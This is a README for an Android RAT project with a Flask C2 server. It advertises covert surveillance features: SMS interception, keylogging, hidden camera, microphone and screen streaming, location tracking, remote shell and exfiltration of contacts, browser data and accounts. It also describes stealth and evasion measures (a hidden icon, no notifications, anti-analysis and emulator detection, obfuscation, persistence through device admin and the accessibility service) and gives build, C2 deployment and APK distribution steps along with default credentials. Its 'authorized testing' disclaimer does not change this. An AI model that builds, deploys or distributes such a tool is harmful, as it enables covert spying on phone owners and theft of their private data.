# RAT APK Project - Android Remote Administration Tool

A comprehensive Android RAT (Remote Administration Tool) with C2 server, built for GitHub Codespaces.

## 🎯 Features

### Android Client Capabilities
- **Device Information**: Model, brand, Android version, root status, hardware details
- **SMS Management**: Read, send, delete, intercept SMS messages
- **Call Logs**: Read incoming/outgoing/missed calls with duration
- **Contacts**: Full contact list with phones, emails, addresses
- **Location Tracking**: GPS, network, passive location updates
- **File System**: List, download, upload, delete, search files
- **App Management**: List installed apps, install/uninstall/launch apps
- **Camera**: Take photos, record video, live stream
- **Microphone**: Record audio, live audio stream
- **Screen**: Screenshot, screen recording, live screen stream
- **Keylogger**: Capture keystrokes, clipboard monitoring
- **Shell**: Execute commands, interactive shell sessions
- **Persistence**: Device admin, boot receiver, hide icon, battery optimization bypass
- **Network**: WiFi scan/connect, TCP/UDP connections, port scanning
- **Bluetooth**: Scan, pair, enumerate devices
- **NFC**: Read/write tags
- **Notifications**: Read, send notifications
- **Browser**: History, bookmarks extraction
- **Accounts**: Google, Samsung, other account enumeration
- **Encryption**: File encryption/decryption (AES-GCM)

### C2 Server Features
- **REST API**: Full device management via HTTP/JSON
- **WebSocket**: Real-time command delivery and results
- **Dashboard**: Web-based control panel with live updates
- **Database**: SQLite storage for devices, commands, exfiltrated data
- **Authentication**: Token-based admin authentication
- **Audit Logging**: All admin actions logged
- **Multi-device**: Manage hundreds of devices simultaneously

## 🏗️ Architecture

```
┌─────────────────┐     HTTPS/WSS      ┌─────────────────┐
│  Android RAT    │ ◄─────────────────► │   C2 Server     │
│  (APK)          │  Commands + Data   │  (Flask+SocketIO)│
└─────────────────┘                    └─────────────────┘
        │                                       │
        ▼                                       ▼
┌─────────────────┐                    ┌─────────────────┐
│  Device Data    │                    │  Web Dashboard  │
│  SQLite/Files   │                    │  (Real-time)    │
└─────────────────┘                    └─────────────────┘
```

## 🚀 Quick Start (GitHub Codespaces)

### 1. Open in Codespaces
Click **"Code" → "Codespaces" → "Create codespace on main"**

### 2. Build the APK
```bash
# Build debug APK
build-apk

# Or manually:
cd android-client
./gradlew assembleDevelopmentDebug
```

### 3. Start Android Emulator (optional)
```bash
# In a new terminal
start-emulator.sh
```

### 4. Install APK on Device/Emulator
```bash
# Debug build
install-debug

# Release build
install-release
```

### 5. Start C2 Server
```bash
# In a new terminal
start-c2.sh
```

### 6. Access Dashboard
Open `http://localhost:8080/dashboard` in your browser
- Username: `admin`
- Password: `ratadmin123`

## 📦 Build Variants

| Variant | C2 Host | Port | Protocol | Use Case |
|---------|---------|------|----------|----------|
| `development` | 10.0.2.2 | 8080 | http | Local emulator testing |
| `staging` | staging-c2.example.com | 8443 | https | Staging environment |
| `production` | c2.example.com | 443 | https | Production deployment |

Build specific variant:
```bash
./gradlew assembleDevelopmentDebug
./gradlew assembleProductionRelease
```

## ⚙️ Configuration

### C2 Server Configuration
Set environment variables in `.devcontainer/devcontainer.json` or Codespaces secrets:
```json
{
  "C2_HOST": "your-c2-domain.com",
  "C2_PORT": "443",
  "C2_PROTOCOL": "https"
}
```

### Release Signing
Configure in GitHub Codespaces secrets:
- `KEYSTORE_PASSWORD`
- `KEY_ALIAS`
- `KEY_PASSWORD`

## 🔧 Development Commands

```bash
# Android Client
cd android-client
./gradlew clean                    # Clean build
./gradlew assembleDebug            # Debug APK
./gradlew assembleRelease          # Release APK
./gradlew lintDebug                # Run lint
./gradlew testDebugUnitTest        # Unit tests
./gradlew detekt                   # Static analysis

# C2 Server
cd c2-server
python src/app.py                  # Run server
python -m pytest tests/            # Run tests

# Device Management
adb devices -l                     # List devices
adb logcat -s RatService:D         # View RAT logs
adb shell dumpsys activity         # View activities
```

## 📁 Project Structure

```
rat-project/
├── android-client/              # Android RAT Client
│   ├── app/
│   │   ├── src/main/
│   │   │   ├── java/com/rat/client/
│   │   │   │   ├── command/       # Command implementations
│   │   │   │   ├── crypto/        # Encryption utilities
│   │   │   │   ├── receiver/      # Broadcast receivers
│   │   │   │   ├── service/       # Background services
│   │   │   │   └── util/          # Utility classes
│   │   │   ├── res/               # Resources (XML, layouts)
│   │   │   └── AndroidManifest.xml
│   │   ├── build.gradle.kts
│   │   └── proguard-rules.pro
│   ├── gradle/wrapper/
│   ├── build.gradle.kts
│   └── settings.gradle.kts
├── c2-server/                   # Command & Control Server
│   ├── src/
│   │   └── app.py              # Flask + SocketIO server
│   ├── requirements.txt
│   └── Dockerfile
├── .devcontainer/               # GitHub Codespaces config
│   ├── devcontainer.json
│   ├── Dockerfile
│   ├── entrypoint.sh
│   ├── setup.sh
│   └── start.sh
├── .github/workflows/           # CI/CD pipelines
│   └── android-build.yml
├── docs/                        # Documentation
├── scripts/                     # Utility scripts
└── README.md
```

## 🔐 Security Features

- **Encrypted Communications**: AES-GCM for data, RSA for key exchange
- **Certificate Pinning**: Configurable network security config
- **Code Obfuscation**: ProGuard/R8 with aggressive optimization
- **Anti-Analysis**: Root detection, emulator detection, debugger detection
- **Persistence**: Device admin, boot receiver, accessibility service
- **Stealth**: Hidden icon, no notifications, battery optimization bypass

## 🧪 Testing

### Unit Tests
```bash
cd android-client
./gradlew testDevelopmentDebugUnitTest
```

### Instrumented Tests (requires device/emulator)
```bash
./gradlew connectedDevelopmentDebugAndroidTest
```

### C2 Server Tests
```bash
cd c2-server
python -m pytest tests/ -v
```

## 📦 CI/CD Pipeline

The GitHub Actions workflow (`.github/workflows/android-build.yml`) handles:

1. **Build Matrix**: All variant/type combinations (6 builds)
2. **Lint & Static Analysis**: Android Lint, Detekt
3. **Unit Tests**: JUnit + Mockito
4. **Security Scan**: Trivy, Gitleaks
5. **Release**: Auto-create GitHub releases on main branch

## 🌐 Deployment

### C2 Server (Production)
```bash
# Using Docker
cd c2-server
docker build -t rat-c2 .
docker run -d -p 8080:8080 -p 8081:8081 \
  -e SECRET_KEY=your-secret \
  -e ADMIN_PASSWORD_HASH=your-hash \
  -v $(pwd)/data:/app/data \
  rat-c2

# Using Docker Compose
docker-compose up -d
```

### APK Distribution
- **Debug**: Direct install via ADB
- **Release**: Sign with production keystore, distribute via your channel

## ⚠️ Legal Disclaimer

**This tool is for authorized security testing and educational purposes only.**

- Only use on devices you own or have explicit written permission to test
- Unauthorized access to devices is illegal in most jurisdictions
- The authors are not responsible for any misuse or damage
- This software is provided "as is" without warranty

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Run tests and linting
5. Submit a pull request

## 📄 License

This project is licensed under the MIT License - see the LICENSE file for details.

## 🙏 Acknowledgments

- Android Open Source Project
- Flutter/React Native for inspiration
- Security research community
- GitHub Codespaces for the amazing cloud dev environment

---

**Built with ❤️ for security research and education**